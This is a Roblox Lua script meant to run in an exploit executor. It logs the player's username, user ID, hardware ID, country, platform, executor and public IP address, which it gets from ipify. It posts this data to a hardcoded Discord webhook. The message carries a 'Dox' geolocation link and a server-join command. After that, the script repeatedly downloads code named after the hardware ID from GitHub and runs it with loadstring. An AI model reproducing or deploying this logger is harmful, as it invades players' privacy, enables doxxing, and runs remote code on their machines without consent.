local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local platform = UserInputService:GetPlatform()
local platformNameMap = {
    [Enum.Platform.Windows] = "Windows PC",
    [Enum.Platform.OSX] = "Mac",
    [Enum.Platform.IOS] = "iOS Device",
    [Enum.Platform.Android] = "Android Device",
    [Enum.Platform.UWP] = "UWP",
    [Enum.Platform.PS4] = "PlayStation 4",
}
local deviceType = platformNameMap[platform] or "Unknown Device"

local username = Players.LocalPlayer.Name
local userId = Players.LocalPlayer.UserId
local hwid = RbxAnalyticsService:GetClientId()
local scriptName = "YourScriptNameHere"
local gameId = game.PlaceId
local gameName = MarketplaceService:GetProductInfo(gameId).Name
local joinLink = "https://www.roblox.com/games/" .. gameId
local player = game.Players.LocalPlayer
local job = tostring(game.JobId)
local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "')"
local currentTime = os.date("%Y-%m-%d %H:%M:%S")

local countryCode
local success, result = pcall(function()
    return LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer)
end)
if success then
    countryCode = result
else
    countryCode = "Unknown"
end

local ipAddress = "Unknown"
if syn then
    ipAddress = syn.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
elseif http then
    ipAddress = http.request({Url = "https://api64.ipify.org?format=json", Method = "GET"}).Body
end
ipAddress = HttpService:JSONDecode(ipAddress).ip

local githubRepo = "Pumpuma/test" -- Replace with your GitHub username/repo
local filePath = "Blacklisted.lua" -- The path to the file to edit
local function generateEditURL()
    return "https://github.com/" .. githubRepo .. "/edit/main/" .. filePath .. "?message=" .. HttpService:UrlEncode("Add new HWID") .. "&value=" .. HttpService:UrlEncode(" ")
end
local exe = identifyexecutor()

local function generateGeoLink(ip)
    return "https://ipinfo.io/" .. ip
end

-- Construct the webhook data
local url = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"  -- Replace with your webhook URL
local data = {
    ["content"] = " ",
    ["embeds"] = {
        {
            ["title"] = "Joshua's logger",
            ["description"] = "Username: " .. username .. "\n" ..
                              "Player ID: " .. userId .. "\n" ..
                              "Key: N/A\n" ..
                              "Exp: N/A\n" ..
                              "Country: " .. countryCode .. "\n" ..
                              "Platform: " .. deviceType .. "\n" ..
                              "IP Address: " .. ipAddress .. "\n" ..
                              "Executor: " .. exe .. "\n" ..
                              "Time: " .. currentTime .. "\n" ..
                              "Join: ```" .. teleportStatement .. "```",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(username)
            },
            ["fields"] = {
                {
                    ["name"] = "Commands",
                    ["value"] = "[Blacklist](" .. generateEditURL() .. ")\n" ..
                                "[Dox](" .. generateGeoLink(ipAddress) .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = true
                }
            }
        }
    }
}

local newdata = HttpService:JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
local success, err = pcall(function()
    request(abcdef)
end)
if not success then
    warn("Failed to send Discord message: " .. err)
end


while true do
    wait(5)
    local success, result = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/Pumpuma/UKI/main/" .. hwid .. ".lua"))()
    end)

    if success then
        break
    else
        return
    end
end

